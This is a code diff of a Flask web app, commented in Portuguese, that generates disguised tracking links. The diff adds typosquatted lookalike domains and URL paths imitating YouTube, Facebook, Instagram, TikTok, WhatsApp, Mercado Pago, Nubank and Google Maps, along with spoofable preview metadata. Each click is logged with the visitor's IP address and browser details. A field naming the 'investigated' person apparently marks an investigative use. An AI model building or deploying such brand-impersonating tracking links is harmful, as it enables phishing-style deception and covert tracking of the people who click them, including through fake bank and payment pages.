@@ -9,30 +9,34 @@ from flask_migrate import Migrate
 import os
 
 DOMINIOS_FALSOS = {
-    "youtube": [
-        "youtube.c0m.lat", "y0utube.com.br", "you-tube.video", "youtubee.site", "y0u.tube.link"
-    ],
-    "facebook": [
-        "faceb00k.page", "facebooke.live", "f4cebook.com", "fbk.social", "facebook-br.net"
-    ],
-    "instagram": [
-        "1nstagram.store", "insta-gram.pics", "instagramm.live", "instagram.c0m.lat", "graminsta.link"
-    ]
+    "youtube": ["youtube.c0m.lat", "y0utube.com.br", "you-tube.video"],
+    "facebook": ["faceb00k.page", "facebooke.live", "f4cebook.com"],
+    "instagram": ["1nstagram.store", "insta-gram.pics"],
+    "tiktok": ["t1kt0k.video", "tik-tok.click"],
+    "kwai": ["kwaii.link", "kwai-br.fun"],
+    "whatsapp": ["whatszap.click", "wpp.me-confirma.live"],
+    "mercado_pago": ["mpago.site", "mercado-br.online"],
+    "nubank": ["nub4nk.app", "nubanq.link"],
+    "maps": ["maps-google.place", "g0oglemaps.live"]
+}
+
+CAMINHOS_FALSOS = {
+    "youtube": ["/watch?v={slug}", "/live/{slug}"],
+    "facebook": ["/profile.php?id={slug}", "/story.php?story_fbid={slug}"],
+    "instagram": ["/p/{slug}", "/reel/{slug}"],
+    "tiktok": ["/@user/video/{slug}", "/v/{slug}"],
+    "kwai": ["/video/{slug}", "/share/{slug}"],
+    "whatsapp": ["/chat/{slug}", "/group/join/{slug}"],
+    "mercado_pago": ["/cobranca/{slug}", "/pagamento/{slug}"],
+    "nubank": ["/boleto/{slug}", "/pix/{slug}"],
+    "maps": ["/place/{slug}", "/dir/?api=1&destination={slug}"]
 }
 
 def gerar_link_falso(slug, plataforma="youtube"):
-    dominios = DOMINIOS_FALSOS.get(plataforma, DOMINIOS_FALSOS["youtube"])
-    dominio_escolhido = random.choice(dominios)
+    dominio = random.choice(DOMINIOS_FALSOS.get(plataforma, DOMINIOS_FALSOS["youtube"]))
+    caminho = random.choice(CAMINHOS_FALSOS.get(plataforma, [f"/{slug}"]))
+    return f"https://{dominio}{caminho}"
 
-    caminhos_possiveis = {
-        "youtube": [f"/a/{slug}", f"/watch?v={slug}", f"/shorts/{slug}", f"/live/{slug}"],
-        "facebook": [f"/story.php?story_fbid={slug}", f"/profile.php?id={slug}", f"/reel/{slug}"],
-        "instagram": [f"/reel/{slug}", f"/p/{slug}", f"/stories/user/{slug}"]
-    }
-
-    caminho = random.choice(caminhos_possiveis.get(plataforma, [f"/a/{slug}"]))
-
-    return f"https://{dominio_escolhido}{caminho}"
 
 app = Flask(__name__, instance_relative_config=True)
 app.secret_key = 'P@licia1080#'
@@ -80,7 +84,11 @@ class Link(db.Model):
     slug = db.Column(db.String(100), unique=True, nullable=False)
     destino = db.Column(db.String(300), nullable=False)
     nome_investigado = db.Column(db.String(200))  # <== este campo precisa estar aqui
-
+    plataforma = db.Column(db.String(50))
+    og_title = db.Column(db.String(200))
+    og_description = db.Column(db.String(300))
+    og_image = db.Column(db.String(300))
+    
 # Tabela de acessos
 class Acesso(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -116,6 +124,9 @@ def criar_link():
         destino = request.form["destino"]
         slug = request.form["slug"] or gerar_slug()
         plataforma = request.form["plataforma"]
+        og_title = request.form["og_title"]
+        og_description = request.form["og_description"]
+        og_image = request.form["og_image"]
 
         if Link.query.filter_by(slug=slug).first():
             return "Slug já existe! Escolha outro.", 400
@@ -123,16 +134,18 @@ def criar_link():
         novo_link = Link(
             slug=slug,
             destino=destino,
-            nome_investigado=nome_investigado
+            nome_investigado=nome_investigado,
+            plataforma=plataforma,
+            og_title=og_title,
+            og_description=og_description,
+            og_image=og_image
         )
         db.session.add(novo_link)
         db.session.commit()
 
         if "127.0.0.1" in request.host_url or "localhost" in request.host_url:
-            # Modo local: usa link funcional direto para teste
             link_disfarcado = f"{request.host_url}link/{slug}"
         else:
-            # Modo produção (Render): usa link falso disfarçado
             link_disfarcado = gerar_link_falso(slug, plataforma)
 
         return render_template("link_gerado.html", link=link_disfarcado)
@@ -148,8 +161,6 @@ def gerar_slug(tamanho=8):
 @app.route("/link/<slug>")
 def rastrear_link(slug):
     link = Link.query.filter_by(slug=slug).first_or_404()
-    if not link:
-        return "Link não encontrado", 404
 
     visitor_ip = request.remote_addr
     user_agent = request.headers.get("User-Agent")
@@ -159,7 +170,7 @@ def rastrear_link(slug):
     db.session.add(novo)
     db.session.commit()
 
-    return render_template("index.html", slug=slug, destino=link.destino)
+    return render_template("index.html", slug=slug, destino=link.destino, link=link)
 
 # Página inicial
 @app.route("/todos_links")
